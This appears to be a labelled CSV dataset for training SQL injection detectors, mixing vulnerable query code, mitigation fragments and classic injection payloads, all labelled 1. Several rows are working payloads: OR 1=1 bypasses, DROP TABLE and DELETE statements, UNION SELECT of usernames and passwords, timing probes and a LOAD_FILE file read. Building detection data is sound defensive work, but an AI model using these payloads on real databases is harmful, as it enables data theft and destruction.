text,label
"SqlDataAdapter myCommand = new SqlDataAdapter(""AuthorLogin"", conn);",1
"SqlParameter parm = myCommand.SelectCommand.Parameters.Add(""@au_id"", SqlDbType.VarChar, 11);",1
"""SELECT au_lname, au_fname FROM Authors WHERE au_id = "" + Login.Text)",1
"s.Replace("";"", ""[[]""); s.Replace(""%"", ""[[%]""); s.Replace(""_"", ""[_]"");",1
SELECT object_Name(id) FROM syscomments WHERE UPPER(TEXT) LIKE '%EXECUTE (%' OR UPPER(TEXT) LIKE '%EXECUTE (%' OR UPPER(TEXT) LIKE '%EXECUTE (%' OR UPPER(TEXT) LIKE '%EXEC (%' OR UPPER(TEXT) LIKE '%EXEC (%' OR UPPER(TEXT) LIKE '%EXEC (%' OR UPPER(TEXT) LIKE '%EXEC (%' OR UPPER(TEXT) LIKE '%SP_EXECUTESQL%',1
"txtSQL = ""SELECT * FROM Users WHERE UserId = "" + txtUserId;",1
QUOTENAME(txtUserId),1
"REPLACE(txtUserID, '""', '''')",1
QUOTENAME(),1
REPLACE(),1
QUOTENAME(@variable),1
REPLACE() and @newpassword,1
DECLARE @objectname SYSNAME;,1
SET @objectname = QUOTENAME(@schemaname) + '.' + QUOTENAME(@tablename);,1
"xtUserId = getRequestString(""UserId""); txtSQL = ""SELECT * FROM Users WHERE UserId = "" + txtUserId;",1
SELECT * FROM items WHERE owner = 'hacker' AND itemname = 'name'; DELETE FROM items; --,1
"txtUserId = getRequestString(""UserId""); txtSQL = ""SELECT * FROM Users WHERE UserId = "" + txtUserId;",1
"select id, firstname, lastname from authors where firstname = 'evil'ex' and lastname ='newman'",1
"txtUserId = getRequestString(""UserId"");",1
"txtSQL = ""SELECT * FROM Users WHERE UserId = "" + txtUserId;",1
.com/items/items.asp?itemid=999 or 1=1,1
http://www.estore.com/items/iteams.asp?itemid=999; DROP TABLE Users,1
"SELECT ItemName, ItemDescription FROM Items WHERE ItemNumber = 999 OR 1=1",1
"http://www.estore.com/items/items.asp?itemid=999 UNION SELECT user-name, password FROM USERS",1
"SELECT ItemName, ItemDescription FROM Items WHERE ItemID = '999' UNION SELECT Username, Password FROM Users;",1
http://www.estore.com/items/iteams.asp?itemid=999,1
DROP TABLE Users,1
"UNION SELECT user-name, password FROM USERS",1
"SELECT ItemName, ItemDescription FROM Items WHERE ItemNumber = 999",1
"""SELECT * FROM customers WHERE account = ‘“ + userProvidedAccountNumber +”’;""",1
"""‘"" or '1' = '1';""",1
"jsmith,P@$$w0rd",1
"sbrown,WinterIsComing!",1
"kcharles,Sup3rSecur3Password$",1
Select ID from Users where username=’jsmith’ and password=’P@$$w0rd’,1
1 and let the u.,1
"""SELECT * FROM Users WHERE UserId = "" + txtUserId;",1
SELECT ID,1
UNION SELECT,1
"txtUserId = getRequestString(""UserId""); txtSQL = ""SELECT * FROM Users WHERE UserId = "" + txtUserId;",1
"txtUserId = getRequestString(""UserId"");",1
"txtSQL = ""SELECT * FROM Users WHERE UserId = "" + txtUserId;",1
10; DROP TABLE members,1
SELECT * FROM members WHERE username = 'admin' AND password = 'password',1
/*Comment Here*/,1
/*! MYSQL special comment format */,1
"SELECT IF(1=1,'true','false')",1
IF (1=1) SELECT 'true' ELSE SELECT 'false',1
BEGIN IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;,1
SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END,1
"SELECT iif(1<2, ""True"", ""False"")",1
SELECT CHAR(0x66),1
SELECT 0x5045,1
SELECT 0x50 + 0x45,1
SELECT login + '-' + password FROM members,1
"SELECT CONCAT(login, password) FROM members",1
SELECT CHAR(75)+CHAR(76)+CHAR(77),1
SELECT CHR(75),1
SELECT LOAD_FILE(0x633A5C626F6F742E696E69),1
SELECT ASCII('a'),1
ASCII Value: 64,1
SELECT CHR(64),1
select header txt FROM news union all select name pass FROM members,1
union select 1 'anotheruser' any string 1--,1
use fieldname COLLATE SQL_Latin1_General_Cp1254_CS_AS,1
